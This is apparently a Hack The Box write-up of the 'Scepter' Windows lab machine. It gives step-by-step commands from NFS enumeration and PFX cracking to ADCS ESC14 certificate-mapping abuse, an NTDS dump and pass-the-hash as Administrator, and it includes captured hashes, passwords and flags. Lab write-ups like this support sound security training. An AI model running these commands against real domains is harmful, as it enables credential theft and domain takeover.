```json
Alias: Scepter
Date: 20-04_2025
Platform: Hackthebox
OS: Windows
Difficulty: Hard
Status: Complete
IP: 10.10.11.65
```

# Scepter
# Summary

- Placeholder

# Lessons Learnt

* Look for accounts with altSecurityIdentities set when dealing with ADCS Certificate mapping

---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 20:15 PKT
Nmap scan report for 10.10.11.65
Host is up (0.13s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-20 23:15:51Z)
111/tcp  open  rpcbind?
| rpcinfo:
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-20T23:16:52+00:00; +8h00m09s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-20T23:16:53+00:00; +8h00m09s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-20T23:16:52+00:00; +8h00m09s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-04-20T23:16:53+00:00; +8h00m09s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T00:21:41
|_Not valid after:  2025-11-01T00:41:41
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
|_ssl-date: 2025-04-20T23:16:53+00:00; +8h00m09s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-04-20T23:16:43
|_  start_date: N/A
|_clock-skew: mean: 8h00m08s, deviation: 0s, median: 8h00m08s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

NFS is running on the box, we can see the available folders using:

```bash
showmount -e $IP
```

`/helpdesk` is available to everyone, we can mount it and get it's files.

```bash
sudo mount -t nfs $IP:/helpdesk nfs -o nolock
```

the folder contains some password protected certificates. We can very quickly find the password out if we use

```bash
crackpkcs12 -d rockyou.txt clark.pfx
```

We find the password: `newpassword` which is used for all the certificates

Enumerating with kerbrute, only d.baker seems to be a valid user. So let's try to log in a d.baker. First convert `baker.crt` and `baker.key` back to pfx format.

```bash
openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt
```

Use gettgtpkinit.py to get TGT using the pfx file.

```bash
gettgtpkinit -cert-pfx $(pwd)/baker.pfx -pfx-pass newpassword scepter.htb/d.baker $(pwd)/d.baker.ccache
```

Get NTHash from TGT

```bash
getnthash -key 'ce7c74501790e2fc56f04b7173297c1adb2479463e3b54644b0e439e14095156' -dc-ip $IP 'scepter.htb/d.baker'
```

| Username | Password                         |
| -------- | -------------------------------- |
| d.baker  | 18b5fb0d99e7a475316213c15b6f22ce |

D.Baker has ForceChangePassword over A.Carter.

![[Pasted image 20250422220529.png]]


```bash
bloodyAD --host dc01.scepter.htb -u 'd.baker' -p ':18b5fb0d99e7a475316213c15b6f22ce' --dc-ip $IP -d scepter.htb set password 'a.carter' 'N3wP@ss!23'
```

| Username | Password   |
| -------- | ---------- |
| a.carter | N3wP@ss!23 |

I was having some kind of problem collecting ldap data using nxc but rusthound saved me

```bash
rusthound -d scepter.htb -u 'a.carter' -p 'N3wP@ss!23' -f dc01.scepter.htb -i $IP -n $IP -z
```

After collecting data again, as a.carter. The only new link added is a GenericWrite from a.carter over the Computers container which is empty. The other privilege a.carter has is GenericAll over the OU Staff Access Certificate, who's only member is d.baker whom we already own.

I thought this circular privilege escalation was a rabbit hole but if you look at the templates using certipy

```bash
certipy find -u 'd.baker' -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -dc-ip $IP -stdout -vulnerable
```

```
Certificate Templates
  0
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireEmail
                                          SubjectRequireDnsAsCn
                                          SubjectAltRequireEmail
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Dacl Principals           : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Property Principals       : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC9                              : 'SCEPTER.HTB\\staff' can enroll and template has no security extension
```


Notice that we have a template vulnerable to ESC14 (Although it says ESC9). Now the GenericAll over d.baker will make sense if you read https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension.

---

# Exploitation

## (ESC14 B) Target with X509RFC822 (email)

The target has an explicit weak mapping of type X509RFC822. The attacker can modify the mail attribute of the victim so that it matches the X509RFC822 mapping of the target. It is then possible to enroll on the certificate model with the victim, and use the certificate obtained to authenticate as the target.

For this attack, a few additional prerequisites are necessary:

- The target is a user account
- The target already has at least one `X509RFC822` mapping in `altSecurityIdentities`
- The attacker has write access to the `mail` attribute of the victim
- The certificate template shows `CT_FLAG_NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag` and shows the attribute `CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` in `msPKI-Certificate-Name-Flag`
- For PKINIT, `StrongCertificateBindingEnforcement` is set to `0` or `1`
- For Schannel, `CertificateMappingMethods` indicates `0x8` and `StrongCertificateBindingEnforcement` is set to `0` or `1`

And h.brown has the attribute
```
altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb
```
set


Start by giving a.carter generic all over the OU which contains d.baker.

```bash
./dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' scepter.htb/a.carter:'N3wP@ss!23' -dc-ip $IP
```

Set the mail of d.baker to `h.brown@scepter.htb`

```bash
bloodyAD --host dc01.scepter.htb -u 'a.carter' -p 'N3wP@ss!23' --dc-ip $IP -d scepter.htb set object d.baker mail -v h.brown@scepter.htb
```

Get the certificate

```bash
certipy req -username "d.baker@scepter.htb" -hashes "18b5fb0d99e7a475316213c15b6f22ce" -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
```

try to log in

```bash
certipy auth -pfx 'd.baker.pfx' -domain "scepter.htb" -user h.brown
```

and we should get the hash for h.brown.

| Username | Password                         |
| -------- | -------------------------------- |
| h.brown  | 4ecf5242092c6fb8c360a08069c75a0c |
But if you use hash to try to authenticate as h.brown you will get a `STATUS_ACCOUNT_RESTRICTION` error. That is due to `h.brown` being a part of the `PROTECTED_USERS` group. Users in this group can't use NTLM Authentication.

So setup kerberos prerequisites and use the TGT we got from `certipy auth`.

We can then `winrm`

```bash
evil-winrm -r SCEPTER.HTB -i dc01.scepter.htb
```

---

# Lateral Movement

Next, see what objects are writable by h.brown

```bash
bloodyAD --host scepter.htb -k get writable
```

And you'll notice that `p.adams` is writable. So, let's just add an `altSecurityIdentities` attribute to it, like there is for `h.brown`

```bash
bloodyAD --host scepter.htb -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>p.adams@scepter.htb'
```

And perform the above attack again like we did for `h.brown`.
Set mail of d.baker to `p.adams@scepter.htb`

```bash
bloodyAD --host dc01.scepter.htb -u 'a.carter' -p 'N3wP@ss!23' --dc-ip $IP -d scepter.htb set object d.baker mail -v p.adams@scepter.htb
```

Request certificate

```bash
certipy req -username "d.baker@scepter.htb" -hashes "18b5fb0d99e7a475316213c15b6f22ce" -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
```

and get hash

```bash
certipy auth -pfx 'd.baker.pfx' -domain "scepter.htb" -user p.adams
```

| Username | Hash                             |
| -------- | -------------------------------- |
| p.adams  | 1b925c524f447bb821a8789c4b118ce0 |

---

# Privilege Escalation

Finally, dump the NTDS!

```bash
secretsdump.py scepter.htb/p.adams@$IP -hashes :1b925c524f447bb821a8789c4b118ce0
```

| Username      | Hash                             |
| ------------- | -------------------------------- |
| Administrator | a291ead3493f9773dc615e66c2ea21c4 |

```bash
evil-winrm -i $IP -u Administrator -H a291ead3493f9773dc615e66c2ea21c4
```

---

# Flags
- a8a7fb6b3e8122c3142c58b168b8d5c7
- d0405774e35fbe73b136ea549d60ffc0

#CTF